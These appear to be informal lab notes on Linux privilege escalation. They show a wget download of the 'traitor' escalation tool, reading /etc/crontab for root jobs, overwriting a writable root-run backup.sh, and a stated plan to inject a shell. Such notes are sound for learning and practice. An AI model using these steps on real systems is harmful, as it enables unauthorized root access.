tools:
one of the best
 wget https://github.com/liamg/traitor/releases/download/v0.0.14/traitor-amd64


 ## Cronjobs PrivEsc
 Any user can read the file keeping system-wide cron jobs under /etc/crontab
 $ cat /etc/crontab
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py


$ cd /home/karen/         
$ ls
backup.sh
$ cat backup.sh 
#!/bin/bash
cd /home/admin/1/2/3/Results
zip -r /home/admin/download.zip ./*
$ echo "blo" > backup.sh
$ cat backup.sh 
blo
Ok it's writable i will inject my shell